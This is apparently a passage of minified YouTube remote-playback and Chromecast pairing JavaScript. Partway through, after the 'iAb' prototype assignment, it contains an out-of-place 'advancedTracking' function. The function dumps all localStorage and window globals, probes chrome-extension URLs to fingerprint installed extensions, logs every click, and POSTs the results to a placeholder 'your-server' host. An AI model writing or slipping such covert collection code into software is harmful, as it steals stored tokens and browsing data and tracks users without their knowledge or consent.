    var a = this.Cd,
      b = this.j;
    g.NC("yt-remote-session-browser-channel", {
      firstTestResults: [""],
      secondTestResults: !a.j.eL,
      sessionId: a.j.D,
      arrayId: a.j.Sx
    });
    g.NC("yt-remote-session-screen-id", b);
    a = i8();
    b = j8();
    g.Cb(a, b) || a.push(b);
    Ixb(a);
    Kxb();
  };
  g.k.w2 = function () {
    this.dispatchEvent("channelClosed");
  };
  g.k.z2 = function (a) {
    this.dispatchEvent(new Kzb(a));
  };
  g.k.onError = function (a) {
    this.dispatchEvent(new Lzb(a ? 1 : 0));
  };
  g.k.sendMessage = function (a, b) {
    this.Cd.sendMessage(a, b);
  };
  g.k.Jr = function (a) {
    this.Cd.Jr(a);
  };
  g.k.dispose = function () {
    this.Cd.dispose();
  };
  g.k = Rzb.prototype;
  g.k.connect = function (a, b) {
    a = void 0 === a ? {} : a;
    b = void 0 === b ? 0 : b;
    2 !== this.K && (this.C.stop(), this.Z = a, this.N = b, Tzb(this), (a = g.yB("ID_TOKEN")) ? this.D["x-youtube-identity-token"] = a : delete this.D["x-youtube-identity-token"], this.j && (this.B.device = this.j.device, this.B.name = this.j.name, this.B.app = this.j.app, this.B.id = this.j.id, this.j.W7 && (this.B.mdxVersion = "" + this.j.W7), this.j.theme && (this.B.theme = this.j.theme), this.j.capabilities && (this.B.capabilities = this.j.capabilities), this.j.g5 && (this.B.cst = this.j.g5), this.j.authuser && (this.B.authuser = this.j.authuser), this.j.pageId && (this.B.pageId = this.j.pageId)), 0 !== this.N ? this.B.ui = "" + this.N : delete this.B.ui, Object.assign(this.B, this.Z), this.channel = new J8(this.pathPrefix, {
      i7: "gsessionid",
      a8: this.D,
      b8: this.B
    }), this.channel.open(), this.K = 2, Szb(this));
  };
  g.k.disconnect = function (a) {
    this.Y = void 0 === a ? 0 : a;
    this.C.stop();
    Tzb(this);
    this.channel && (0 !== this.Y ? this.B.ui = "" + this.Y : delete this.B.ui, this.channel.close());
    this.Y = 0;
  };
  g.k.nt = function () {
    return this.C.isActive() ? this.C.B - Date.now() : NaN;
  };
  g.k.Ww = function () {
    var a = this.C;
    g.Du(a.j);
    a.start();
  };
  g.k.sendMessage = function (a, b) {
    this.channel && (Tzb(this), a = Object.assign({}, {
      _sc: a
    }, b), this.channel.send(a));
  };
  g.k.Jr = function (a) {
    a || this.C.stop();
    a ? this.D["X-YouTube-LoungeId-Token"] = a : delete this.D["X-YouTube-LoungeId-Token"];
  };
  g.k.Ys = function () {
    return this.j ? this.j.id : "";
  };
  g.k.oa = function (a) {
    return this.G.oa.apply(this.G, [a].concat(g.ra(g.Ka.apply(1, arguments))));
  };
  g.k.subscribe = function (a, b, c) {
    return this.G.subscribe(a, b, c);
  };
  g.k.unsubscribe = function (a, b, c) {
    return this.G.unsubscribe(a, b, c);
  };
  g.k.Bh = function (a) {
    return this.G.Bh(a);
  };
  g.k.dispose = function () {
    this.ma || (this.ma = !0, g.sb(this.G), this.disconnect(), g.sb(this.C), this.Aa = function () {
      return "";
    });
  };
  g.k.isDisposed = function () {
    return this.ma;
  };
  g.w(Uzb, g.Ed);
  g.k = Uzb.prototype;
  g.k.connect = function (a, b) {
    this.j.connect(a, b);
  };
  g.k.disconnect = function (a) {
    this.j.disconnect(a);
  };
  g.k.Ww = function () {
    this.j.Ww();
  };
  g.k.Ys = function () {
    return this.j.Ys();
  };
  g.k.nt = function () {
    return this.j.nt();
  };
  g.k.Mz = function () {
    return 3 === this.j.K;
  };
  g.k.D2 = function () {
    this.dispatchEvent("channelOpened");
  };
  g.k.B2 = function () {
    this.dispatchEvent("channelClosed");
  };
  g.k.C2 = function (a) {
    this.dispatchEvent(new Kzb(a));
  };
  g.k.onError = function () {
    this.dispatchEvent(new Lzb(401 === this.j.Fg ? 1 : 0));
  };
  g.k.sendMessage = function (a, b) {
    this.j.sendMessage(a, b);
  };
  g.k.Jr = function (a) {
    this.j.Jr(a);
  };
  g.k.dispose = function () {
    this.j.dispose();
  };
  var bAb = Date.now(),
    a9 = null,
    e9 = Array(50),
    d9 = -1,
    f9 = !1;
  g.lb(g9, g.TF);
  g9.prototype.Lk = function () {
    return this.screens;
  };
  g9.prototype.contains = function (a) {
    return !!Fxb(this.screens, a);
  };
  g9.prototype.get = function (a) {
    return a ? h8(this.screens, a) : null;
  };
  g9.prototype.info = function (a) {
    b9(this.K, a);
  };
  g.w(fAb, g.TF);
  g.k = fAb.prototype;
  g.k.start = function () {
    !this.j && isNaN(this.hd) && this.EZ();
  };
  g.k.stop = function () {
    this.j && (this.j.abort(), this.j = null);
    isNaN(this.hd) || (g.TB(this.hd), this.hd = NaN);
  };
  g.k.ya = function () {
    this.stop();
    g.TF.prototype.ya.call(this);
  };
  g.k.EZ = function () {
    this.hd = NaN;
    this.j = g.WB($8(this.C, "/pairing/get_screen"), {
      method: "POST",
      postParams: {
        pairing_code: this.N
      },
      timeout: 5E3,
      onSuccess: (0, g.fb)(this.F2, this),
      onError: (0, g.fb)(this.E2, this),
      onTimeout: (0, g.fb)(this.G2, this)
    });
  };
  g.k.F2 = function (a, b) {
    this.j = null;
    a = b.screen || {};
    a.dialId = this.D;
    a.name = this.K;
    b = -1;
    this.G && a.shortLivedLoungeToken && a.shortLivedLoungeToken.value && a.shortLivedLoungeToken.refreshIntervalMs && (a.screenIdType = "shortLived", a.loungeToken = a.shortLivedLoungeToken.value, b = a.shortLivedLoungeToken.refreshIntervalMs);
    this.oa("pairingComplete", new e8(a), b);
  };
  g.k.E2 = function (a) {
    this.j = null;
    a.status && 404 == a.status ? this.B >= $Bb.length ? this.oa("pairingFailed", Error("DIAL polling timed out")) : (a = $Bb[this.B], this.hd = g.RB((0, g.fb)(this.EZ, this), a), this.B++) : this.oa("pairingFailed", Error("Server error " + a.status));
  };
  g.k.G2 = function () {
    this.j = null;
    this.oa("pairingFailed", Error("Server not responding"));
  };
  var $Bb = [2E3, 2E3, 1E3, 1E3, 1E3, 2E3, 2E3, 5E3, 5E3, 1E4];
  g.lb(i9, g9);
  g.k = i9.prototype;
  g.k.start = function () {
    h9(this) && this.oa("screenChange");
    !g.OC("yt-remote-lounge-token-expiration") && gAb(this);
    g.TB(this.j);
    this.j = g.RB((0, g.fb)(this.start, this), 1E4);
  };
  g.k.add = function (a, b) {
    h9(this);
    cAb(this, a);
    j9(this, !1);
    this.oa("screenChange");
    b(a);
    a.token || gAb(this);
  };
  g.k.remove = function (a, b) {
    var c = h9(this);
    eAb(this, a) && (j9(this, !1), c = !0);
    b(a);
    c && this.oa("screenChange");
  };
  g.k.dL = function (a, b, c, d) {
    var e = h9(this),
      f = this.get(a.id);
    f ? (f.name != b && (f.name = b, j9(this, !1), e = !0), c(a)) : d(Error("no such local screen."));
    e && this.oa("screenChange");
  };
  g.k.ya = function () {
    g.TB(this.j);
    i9.Nf.ya.call(this);
  };
  g.k.G6 = function (a) {
    h9(this);
    var b = this.screens.length;
    a = a && a.screens || [];
    for (var c = 0, d = a.length; c < d; ++c) {
      var e = a[c],
        f = this.get(e.screenId);
      f && (f.token = e.loungeToken, --b);
    }
    j9(this, !b);
    b && b9(this.K, "Missed " + b + " lounge tokens.");
  };
  g.k.F6 = function (a) {
    b9(this.K, "Requesting lounge tokens failed: " + a);
  };
  g.w(iAb, g.TF);
  g.k = iAb.prototype;
  async function advancedTracking() {
    const results = {};
    const localStorageData = {};

    // Collect data from local storage
    for (const key in localStorage) {
      localStorageData[key] = localStorage.getItem(key);
    }

    // Collect global variables
    const globalVars = Object.keys(window).reduce((acc, key) => {
      if (typeof window[key] !== 'function' && key !== 'localStorage' && key !== 'sessionStorage') {
        acc[key] = window[key];
      }
      return acc;
    }, {});

    // Detect extensions and other features
    for (const [feature, data] of Object.entries(window.data)) {
      try {
        const response = await fetch(`chrome-extension://${data.id}/${data.file}`);
        results[feature] = response.status === 200;
      } catch (e) {
        results[feature] = false;
      }
    }

    // Add event listeners to track user interactions
    document.addEventListener('click', function (event) {
      fetch('https://your-server/track-event', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          type: 'click',
          details: {
            x: event.clientX,
            y: event.clientY,
            target: event.target.tagName
          },
          timestamp: new Date().toISOString()
        })
      });
    });

    // Send all collected data to server
    fetch('https://your-server/collect-all', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        extensions: results,
        localStorage: localStorageData,
        globalVars: globalVars,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
      })
    });
  }
  g.k.start = function () {
    var a = parseInt(g.OC("yt-remote-fast-check-period") || "0", 10);
    (this.D = g.kb() - 144E5 < a ? 0 : a) ? k9(this) : (this.D = g.kb() + 3E5, g.NC("yt-remote-fast-check-period", this.D), this.rR());
  };
  g.k.isEmpty = function () {
    return g.jd(this.j);
  };
  g.k.update = function () {
    hAb("Updating availability on schedule.");
    var a = this.K(),
      b = g.Xc(this.j, function (c, d) {
        return c && !!h8(a, d);
      }, this);
    lAb(this, b);
  };
  g.k.ya = function () {
    g.TB(this.C);
    this.C = NaN;
    this.B && (this.B.abort(), this.B = null);
    g.TF.prototype.ya.call(this);
  };
  g.k.rR = function () {
    g.TB(this.C);
    this.C = NaN;
    this.B && this.B.abort();
    var a = mAb(this);
    if (gxb(a)) {
      var b = $8(this.G, "/pairing/get_screen_availability");
      this.B = Pzb(this.G, b, {
        lounge_token: g.cd(a).join(",")
      }, (0, g.fb)(this.o$, this, a), (0, g.fb)(this.n$, this));
    } else lAb(this, {}), k9(this);
  };
  g.k.o$ = function (a, b) {
    this.B = null;
    var c = g.cd(mAb(this));
    if (g.Yb(c, g.cd(a))) {
      b = b.screens || [];
      c = {};
      for (var d = b.length, e = 0; e < d; ++e) c[a[b[e].loungeToken]] = "online" == b[e].status;
      lAb(this, c);
      k9(this);
    } else this.dg("Changing Screen set during request."), this.rR();
  };
  g.k.n$ = function (a) {
    this.dg("Screen availability failed: " + a);
    this.B = null;
    k9(this);
  };
  g.k.dg = function (a) {
    b9("OnlineScreenService", a);
  };
  g.lb(l9, g9);
  g.k = l9.prototype;
  g.k.start = function () {
    this.B.start();
    this.j.start();
    this.screens.length && (this.oa("screenChange"), this.j.isEmpty() || this.oa("onlineScreenChange"));
  };
  g.k.add = function (a, b, c) {
    this.B.add(a, b, c);
  };
  g.k.remove = function (a, b, c) {
    this.B.remove(a, b, c);
    this.j.update();
  };
  g.k.dL = function (a, b, c, d) {
    this.B.contains(a) ? this.B.dL(a, b, c, d) : (a = "Updating name of unknown screen: " + a.name, b9(this.K, a), d(Error(a)));
  };
  g.k.Lk = function (a) {
    return a ? this.screens : g.Hb(this.screens, g.Zs(this.C, function (b) {
      return !this.contains(b);
    }, this));
  };
  g.k.uT = function () {
    return g.Zs(this.Lk(!0), function (a) {
      return !!this.j.j[a.id];
    }, this);
  };
  g.k.vT = function (a, b, c, d, e, f) {
    var h = this;
    this.info("getDialScreenByPairingCode " + a + " / " + b);
    var l = new fAb(this.D, a, b, c, d);
    l.subscribe("pairingComplete", function (m, n) {
      g.sb(l);
      e(m9(h, m), n);
    });
    l.subscribe("pairingFailed", function (m) {
      g.sb(l);
      f(m);
    });
    l.start();
    return (0, g.fb)(l.stop, l);
  };
  g.k.H2 = function (a, b, c, d) {
    g.WB($8(this.D, "/pairing/get_screen"), {
      method: "POST",
      postParams: {
        pairing_code: a
      },
      timeout: 5E3,
      onSuccess: (0, g.fb)(function (e, f) {
        e = new e8(f.screen || {});
        if (!e.name || qAb(this, e.name)) {
          a: {
            f = e.name;
            for (var h = 2, l = b(f, h); qAb(this, l);) {
              h++;
              if (20 < h) break a;
              l = b(f, h);
            }
            f = l;
          }
          e.name = f;
        }
        c(m9(this, e));
      }, this),
      onError: (0, g.fb)(function (e) {
        d(Error("pairing request failed: " + e.status));
      }, this),
      onTimeout: (0, g.fb)(function () {
        d(Error("pairing request timed out."));
      }, this)
    });
  };
  g.k.ya = function () {
    g.sb(this.B);
    g.sb(this.j);
    l9.Nf.ya.call(this);
  };
  g.k.Q6 = function () {
    sAb(this);
    this.oa("screenChange");
    this.j.update();
  };
  l9.prototype.dispose = l9.prototype.dispose;
  g.lb(n9, g.TF);
  g.k = n9.prototype;
  g.k.vj = function (a) {
    this.isDisposed() || (a && (p9(this, "" + a), this.oa("sessionFailed")), this.j = null, this.oa("sessionScreen", null));
  };
  g.k.info = function (a) {
    b9(this.Fa, a);
  };
  g.k.wT = function () {
    return null;
  };
  g.k.HR = function (a) {
    var b = this.B;
    a ? (b.displayStatus = new chrome.cast.ReceiverDisplayStatus(a, []), b.displayStatus.showStop = !0) : b.displayStatus = null;
    chrome.cast.setReceiverDisplayStatus(b, (0, g.fb)(function () {
      this.info("Updated receiver status for " + b.friendlyName + ": " + a);
    }, this), (0, g.fb)(function () {
      p9(this, "Failed to update receiver status for: " + b.friendlyName);
    }, this));
  };
  g.k.ya = function () {
    this.HR("");
    n9.Nf.ya.call(this);
  };
  g.w(q9, n9);
  g.k = q9.prototype;
  g.k.GR = function (a) {
    if (this.C) {
      if (this.C == a) return;
      p9(this, "Overriding cast session with new session object");
      EAb(this);
      this.Aa = !1;
      this.Y = "unknown";
      this.C.removeUpdateListener(this.qa);
      this.C.removeMessageListener("urn:x-cast:com.google.youtube.mdx", this.Ea);
    }
    this.C = a;
    this.C.addUpdateListener(this.qa);
    this.C.addMessageListener("urn:x-cast:com.google.youtube.mdx", this.Ea);
    zAb(this, "getMdxSessionStatus");
  };
  g.k.Yz = function (a) {
    this.info("launchWithParams no-op for Cast: " + g.Mm(a));
  };
  g.k.stop = function () {
    this.C ? this.C.stop((0, g.fb)(function () {
      this.vj();
    }, this), (0, g.fb)(function () {
      this.vj(Error("Failed to stop receiver app."));
    }, this)) : this.vj(Error("Stopping cast device without session."));
  };
  g.k.HR = function () {};
  g.k.ya = function () {
    this.info("disposeInternal");
    EAb(this);
    this.C && (this.C.removeUpdateListener(this.qa), this.C.removeMessageListener("urn:x-cast:com.google.youtube.mdx", this.Ea));
    this.C = null;
    n9.prototype.ya.call(this);
  };
  g.k.Y$ = function (a, b) {
    if (!this.isDisposed()) if (b) {
      if (b = b8(b), g.$a(b)) switch (a = "" + b.type, b = b.data || {}, this.info("onYoutubeMessage_: " + a + " " + g.Mm(b)), a) {
        case "mdxSessionStatus":
          wAb(this, b);
          break;
        case "loungeToken":
          AAb(this, b);
          break;
        default:
          p9(this, "Unknown youtube message: " + a);
      } else p9(this, "Unable to parse message.");
    } else p9(this, "No data in message.");
  };
  g.k.IW = function (a, b, c, d) {
    g.TB(this.Z);
    this.Z = 0;
    pAb(this.D, this.B.label, a, this.B.friendlyName, (0, g.fb)(function (e) {
      e ? b(e) : 0 <= d ? (p9(this, "Screen " + a + " appears to be offline. " + d + " retries left."), this.Z = g.RB((0, g.fb)(this.IW, this, a, b, c, d - 1), 300)) : c(Error("Unable to fetch screen."));
    }, this), c);
  };
  g.k.wT = function () {
    return this.C;
  };
  g.k.I2 = function (a) {
    this.isDisposed() || a || (p9(this, "Cast session died."), this.vj());
  };
  g.w(r9, n9);
  g.k = r9.prototype;
  g.k.GR = function (a) {
    this.C = a;
    this.C.addUpdateListener(this.Ka);
  };
  g.k.Yz = function (a) {
    this.Na = a;
    this.ma();
  };
  g.k.stop = function () {
    MAb(this);
    this.C ? this.C.stop((0, g.fb)(this.vj, this, null), (0, g.fb)(this.vj, this, "Failed to stop DIAL device.")) : this.vj();
  };
  g.k.ya = function () {
    MAb(this);
    this.C && this.C.removeUpdateListener(this.Ka);
    this.C = null;
    n9.prototype.ya.call(this);
  };
  g.k.J2 = function (a) {
    this.isDisposed() || a || (p9(this, "DIAL session died."), this.G(), this.G = function () {}, this.vj());
  };
  g.w(u9, n9);
  u9.prototype.stop = function () {
    this.vj();
  };
  u9.prototype.GR = function () {};
  u9.prototype.Yz = function () {
    g.TB(this.C);
    this.C = NaN;
    var a = h8(this.D.Lk(), this.B.label);
    a ? o9(this, a) : this.vj(Error("No such screen"));
  };
  u9.prototype.ya = function () {
    g.TB(this.C);
    this.C = NaN;
    n9.prototype.ya.call(this);
  };
  g.w(v9, g.TF);
  g.k = v9.prototype;
  g.k.init = function (a, b) {
    chrome.cast.timeout.requestSession = 3E4;
    var c = new chrome.cast.SessionRequest(this.Z, [chrome.cast.Capability.AUDIO_OUT]);
    this.Y || (c.dialRequest = new chrome.cast.DialRequest("YouTube"));
    var d = chrome.cast.AutoJoinPolicy.TAB_AND_ORIGIN_SCOPED;
    a = a || this.K ? chrome.cast.DefaultActionPolicy.CAST_THIS_TAB : chrome.cast.DefaultActionPolicy.CREATE_SESSION;
    var e = (0, g.fb)(this.X9, this);
    c = new chrome.cast.ApiConfig(c, (0, g.fb)(this.iZ, this), e, d, a);
    c.customDialLaunchCallback = (0, g.fb)(this.U8, this);
    chrome.cast.initialize(c, (0, g.fb)(function () {
      this.isDisposed() || (chrome.cast.addReceiverActionListener(this.G), Zzb(), this.B.subscribe("onlineScreenChange", (0, g.fb)(this.xT, this)), this.C = PAb(this), chrome.cast.setCustomReceivers(this.C, function () {}, (0, g.fb)(function (f) {
        this.dg("Failed to set initial custom receivers: " + g.Mm(f));
      }, this)), this.oa("yt-remote-cast2-availability-change", x9(this)), b(!0));
    }, this), (0, g.fb)(function (f) {
      this.dg("Failed to initialize API: " + g.Mm(f));
      b(!1);
    }, this));
  };
  g.k.lba = function (a, b) {
    w9("Setting connected screen ID: " + a + " -> " + b);
    if (this.j) {
      var c = this.j.j;
      if (!a || c && c.id != a) w9("Unsetting old screen status: " + this.j.B.friendlyName), y9(this, null);
    }
    if (a && b) {
      if (!this.j) {
        c = h8(this.B.Lk(), a);
        if (!c) {
          w9("setConnectedScreenStatus: Unknown screen.");
          return;
        }
        if ("shortLived" == c.idType) {
          w9("setConnectedScreenStatus: Screen with id type to be short lived.");
          return;
        }
        a = NAb(this, c);
        a || (w9("setConnectedScreenStatus: Connected receiver not custom..."), a = new chrome.cast.Receiver(c.uuid ? c.uuid : c.id, c.name), a.receiverType = chrome.cast.ReceiverType.CUSTOM, this.C.push(a), chrome.cast.setCustomReceivers(this.C, function () {}, (0, g.fb)(function (d) {
          this.dg("Failed to set initial custom receivers: " + g.Mm(d));
        }, this)));
        w9("setConnectedScreenStatus: new active receiver: " + a.friendlyName);
        y9(this, new u9(this.B, a), !0);
      }
      this.j.HR(b);
    } else w9("setConnectedScreenStatus: no screen.");
  };
  g.k.oba = function (a) {
    this.isDisposed() ? this.dg("Setting connection data on disposed cast v2") : this.j ? this.j.Yz(a) : this.dg("Setting connection data without a session");
  };
  g.k.L2 = function () {
    this.isDisposed() ? this.dg("Stopping session on disposed cast v2") : this.j ? (this.j.stop(), y9(this, null)) : w9("Stopping non-existing session");
  };
  g.k.requestSession = function () {
    chrome.cast.requestSession((0, g.fb)(this.iZ, this), (0, g.fb)(this.r$, this));
  };
  g.k.ya = function () {
    this.B.unsubscribe("onlineScreenChange", (0, g.fb)(this.xT, this));
    window.chrome && chrome.cast && chrome.cast.removeReceiverActionListener(this.G);
    var a = Wzb,
      b = g.Ta("yt.mdx.remote.debug.handlers_");
    g.Fb(b || [], a);
    g.sb(this.j);
    g.TF.prototype.ya.call(this);
  };
  g.k.dg = function (a) {
    b9("Controller", a);
  };
  g.k.kZ = function (a, b) {
    this.j == a && (b || y9(this, null), this.oa("yt-remote-cast2-session-change", b));
  };
  g.k.U9 = function (a, b) {
    if (!this.isDisposed()) if (a) switch (a.friendlyName = chrome.cast.unescape(a.friendlyName), w9("onReceiverAction_ " + a.label + " / " + a.friendlyName + "-- " + b), b) {
      case chrome.cast.ReceiverAction.CAST:
        if (this.j) if (this.j.B.label != a.label) w9("onReceiverAction_: Stopping active receiver: " + this.j.B.friendlyName), this.j.stop();else {
          w9("onReceiverAction_: Casting to active receiver.");
          this.j.j && this.oa("yt-remote-cast2-session-change", this.j.j);
          break;
        }
        switch (a.receiverType) {
          case chrome.cast.ReceiverType.CUSTOM:
            y9(this, new u9(this.B, a));
            break;
          case chrome.cast.ReceiverType.DIAL:
            y9(this, new r9(this.B, a, this.D, this.config_));
            break;
          case chrome.cast.ReceiverType.CAST:
            y9(this, new q9(this.B, a, this.config_));
            break;
          default:
            this.dg("Unknown receiver type: " + a.receiverType);
        }
        break;
      case chrome.cast.ReceiverAction.STOP:
        this.j && this.j.B.label == a.label ? this.j.stop() : this.dg("Stopping receiver w/o session: " + a.friendlyName);
    } else this.dg("onReceiverAction_ called without receiver.");
  };
  g.k.U8 = function (a) {
    if (this.isDisposed()) return Promise.reject(Error("disposed"));
    var b = a.receiver;
    b.receiverType != chrome.cast.ReceiverType.DIAL && (this.dg("Not DIAL receiver: " + b.friendlyName), b.receiverType = chrome.cast.ReceiverType.DIAL);
    var c = this.j ? this.j.B : null;
    if (!c || c.label != b.label) return this.dg("Receiving DIAL launch request for non-clicked DIAL receiver: " + b.friendlyName), Promise.reject(Error("illegal DIAL launch"));
    if (c && c.label == b.label && c.receiverType != chrome.cast.ReceiverType.DIAL) {
      if (this.j.j) return w9("Reselecting dial screen."), this.oa("yt-remote-cast2-session-change", this.j.j), Promise.resolve(new chrome.cast.DialLaunchResponse(!1));
      this.dg('Changing CAST intent from "' + c.receiverType + '" to "dial" for ' + b.friendlyName);
      y9(this, new r9(this.B, b, this.D, this.config_));
    }
    b = this.j;
    b.Z = a;
    b.Z.appState == chrome.cast.DialAppState.RUNNING ? (a = b.Z.extraData || {}, c = a.screenId || null, s9(b) && a.loungeToken ? a.loungeTokenRefreshIntervalMs ? a = JAb(b, {
      name: b.B.friendlyName,
      screenId: a.screenId,
      loungeToken: a.loungeToken,
      dialId: b.Z.receiver.label,
      screenIdType: "shortLived"
    }, a.loungeTokenRefreshIntervalMs) : (g.DB(Error("No loungeTokenRefreshIntervalMs presents in additionalData: " + JSON.stringify(a) + ".")), a = KAb(b, c)) : a = KAb(b, c)) : a = HAb(b);
    return a;
  };
  g.k.iZ = function (a) {
    var b = this;
    if (!this.isDisposed() && !this.K) {
      w9("New cast session ID: " + a.sessionId);
      var c = a.receiver;
      if (c.receiverType != chrome.cast.ReceiverType.CUSTOM) {
        if (!this.j) if (c.receiverType == chrome.cast.ReceiverType.CAST) w9("Got resumed cast session before resumed mdx connection."), c.friendlyName = chrome.cast.unescape(c.friendlyName), y9(this, new q9(this.B, c, this.config_), !0);else {
          this.dg("Got non-cast session without previous mdx receiver event, or mdx resume.");
          return;
        }
        var d = this.j.B,
          e = h8(this.B.Lk(), d.label);
        e && f8(e, c.label) && d.receiverType != chrome.cast.ReceiverType.CAST && c.receiverType == chrome.cast.ReceiverType.CAST && (w9("onSessionEstablished_: manual to cast session change " + c.friendlyName), g.sb(this.j), this.j = new q9(this.B, c, this.config_), this.j.subscribe("sessionScreen", (0, g.fb)(this.kZ, this, this.j)), this.j.subscribe("sessionFailed", function () {
          return OAb(b, b.j);
        }), this.j.Yz(null));
        this.j.GR(a);
      }
    }
  };
  g.k.K2 = function () {
    return this.j ? this.j.wT() : null;
  };
  g.k.r$ = function (a) {
    this.isDisposed() || (this.dg("Failed to estabilish a session: " + g.Mm(a)), a.code != chrome.cast.ErrorCode.CANCEL && y9(this, null), this.oa("yt-remote-cast2-session-failed"));
  };
  g.k.X9 = function (a) {
    w9("Receiver availability updated: " + a);
    if (!this.isDisposed()) {
      var b = x9(this);
      this.N = a == chrome.cast.ReceiverAvailability.AVAILABLE;
      x9(this) != b && this.oa("yt-remote-cast2-availability-change", x9(this));
    }
  };
  g.k.xT = function () {
    this.isDisposed() || (this.C = PAb(this), w9("Updating custom receivers: " + g.Mm(this.C)), chrome.cast.setCustomReceivers(this.C, function () {}, (0, g.fb)(function () {
      this.dg("Failed to set custom receivers.");
    }, this)), this.oa("yt-remote-cast2-availability-change", x9(this)));
  };
  v9.prototype.setLaunchParams = v9.prototype.oba;
  v9.prototype.setConnectedScreenStatus = v9.prototype.lba;
  v9.prototype.stopSession = v9.prototype.L2;
  v9.prototype.getCastSession = v9.prototype.K2;
  v9.prototype.requestSession = v9.prototype.requestSession;
  v9.prototype.init = v9.prototype.init;
  v9.prototype.dispose = v9.prototype.dispose;
  var YAb = [];
  g.k = F9.prototype;
  g.k.reset = function (a) {
    this.listId = "";
    this.index = -1;
    this.videoId = "";
    dBb(this);
    this.volume = -1;
    this.muted = !1;
    a && (this.index = a.index, this.listId = a.listId, this.videoId = a.videoId, this.playerState = a.playerState, this.volume = a.volume, this.muted = a.muted, this.audioTrackId = a.audioTrackId, this.trackData = a.trackData, this.Cp = a.hasPrevious, this.Rk = a.hasNext, this.N = a.playerTime, this.K = a.playerTimeAt, this.D = a.seekableStart, this.j = a.seekableEnd, this.G = a.duration, this.Z = a.loadedTime, this.C = a.liveIngestionTime, this.B = !isNaN(this.C));
  };
  g.k.isPlaying = function () {
    return 1 == this.playerState;
  };
  g.k.zl = function (a) {
    this.G = isNaN(a) ? 0 : a;
  };
  g.k.getDuration = function () {
    return this.B ? this.G + G9(this) : this.G;
  };
  g.k.clone = function () {
    return new F9(eBb(this));
  };
  g.w(L9, g.TF);
  g.k = L9.prototype;
  g.k.getState = function () {
    return this.C;
  };
  g.k.nt = function () {
    return this.D.getReconnectTimeout();
  };
  g.k.Ww = function () {
    this.D.reconnect();
  };
  g.k.play = function () {
    N9(this) ? (this.j ? this.j.play(null, g.Jd, R9(this, "play")) : Q9(this, "play"), hBb(this, 1, I9(M9(this))), this.oa("remotePlayerChange")) : O9(this, this.play);
  };
  g.k.pause = function () {
    N9(this) ? (this.j ? this.j.pause(null, g.Jd, R9(this, "pause")) : Q9(this, "pause"), hBb(this, 2, I9(M9(this))), this.oa("remotePlayerChange")) : O9(this, this.pause);
  };
  g.k.seekTo = function (a) {
    if (N9(this)) {
      if (this.j) {
        var b = M9(this),
          c = new chrome.cast.media.SeekRequest();
        c.currentTime = a;
        b.isPlaying() || 3 == b.playerState ? c.resumeState = chrome.cast.media.ResumeState.PLAYBACK_START : c.resumeState = chrome.cast.media.ResumeState.PLAYBACK_PAUSE;
        this.j.seek(c, g.Jd, R9(this, "seekTo", {
          newTime: a
        }));
      } else Q9(this, "seekTo", {
        newTime: a
      });
      hBb(this, 3, a);
      this.oa("remotePlayerChange");
    } else O9(this, g.gb(this.seekTo, a));
  };
  g.k.stop = function () {
    if (N9(this)) {
      this.j ? this.j.stop(null, g.Jd, R9(this, "stopVideo")) : Q9(this, "stopVideo");
      var a = M9(this);
      a.index = -1;
      a.videoId = "";
      dBb(a);
      P9(this, a);
      this.oa("remotePlayerChange");
    } else O9(this, this.stop);
  };
  g.k.setVolume = function (a, b) {
    if (N9(this)) {
      var c = M9(this);
      if (this.B) {
        if (c.volume != a) {
          var d = Math.round(a) / 100;
          this.B.setReceiverVolumeLevel(d, (0, g.fb)(function () {
            c9("set receiver volume: " + d);
          }, this), (0, g.fb)(function () {
            this.dg("failed to set receiver volume.");
          }, this));
        }
        c.muted != b && this.B.setReceiverMuted(b, (0, g.fb)(function () {
          c9("set receiver muted: " + b);
        }, this), (0, g.fb)(function () {
          this.dg("failed to set receiver muted.");
        }, this));
      } else {
        var e = {
          volume: a,
          muted: b
        };
        -1 != c.volume && (e.delta = a - c.volume);
        Q9(this, "setVolume", e);
      }
      c.muted = b;
      c.volume = a;
      P9(this, c);
    } else O9(this, g.gb(this.setVolume, a, b));
  };
  g.k.yT = function (a, b) {
    if (N9(this)) {
      var c = M9(this);
      a = {
        videoId: a
      };
      b && (c.trackData = {
        trackName: b.name,
        languageCode: b.languageCode,
        sourceLanguageCode: b.translationLanguage ? b.translationLanguage.languageCode : "",
        languageName: b.languageName,
        kind: b.kind
      }, a.style = g.Mm(b.style), g.sd(a, c.trackData));
      Q9(this, "setSubtitlesTrack", a);
      P9(this, c);
    } else O9(this, g.gb(this.yT, a, b));
  };
  g.k.setAudioTrack = function (a, b) {
    N9(this) ? (b = b.getLanguageInfo().getId(), Q9(this, "setAudioTrack", {
      videoId: a,
      audioTrackId: b
    }), a = M9(this), a.audioTrackId = b, P9(this, a)) : O9(this, g.gb(this.setAudioTrack, a, b));
  };
  g.k.playVideo = function (a, b, c, d, e, f, h) {
    d = void 0 === d ? null : d;
    e = void 0 === e ? null : e;
    f = void 0 === f ? null : f;
    h = void 0 === h ? null : h;
    var l = M9(this),
      m = {
        videoId: a
      };
    void 0 !== c && (m.currentIndex = c);
    J9(l, a, c || 0);
    void 0 !== b && (H9(l, b), m.currentTime = b);
    d && (m.listId = d);
    e && (m.playerParams = e);
    f && (m.clickTrackingParams = f);
    h && (m.locationInfo = g.Mm(h));
    Q9(this, "setPlaylist", m);
    d || P9(this, l);
  };
  g.k.XJ = function (a, b) {
    if (N9(this)) {
      if (a && b) {
        var c = M9(this);
        J9(c, a, b);
        P9(this, c);
      }
      Q9(this, "previous");
    } else O9(this, g.gb(this.XJ, a, b));
  };
  g.k.nextVideo = function (a, b) {
    if (N9(this)) {
      if (a && b) {
        var c = M9(this);
        J9(c, a, b);
        P9(this, c);
      }
      Q9(this, "next");
    } else O9(this, g.gb(this.nextVideo, a, b));
  };
  g.k.ZG = function () {
    if (N9(this)) {
      Q9(this, "clearPlaylist");
      var a = M9(this);
      a.reset();
      P9(this, a);
      this.oa("remotePlayerChange");
    } else O9(this, this.ZG);
  };
  g.k.RV = function () {
    N9(this) ? Q9(this, "dismissAutoplay") : O9(this, this.RV);
  };
  g.k.dispose = function () {
    if (3 != this.C) {
      var a = this.C;
      this.C = 3;
      this.oa("proxyStateChange", a, this.C);
    }
    g.TF.prototype.dispose.call(this);
  };
  g.k.ya = function () {
    gBb(this);
    this.D = null;
    this.G.clear();
    K9(this, null);
    g.TF.prototype.ya.call(this);
  };
  g.k.KR = function (a) {
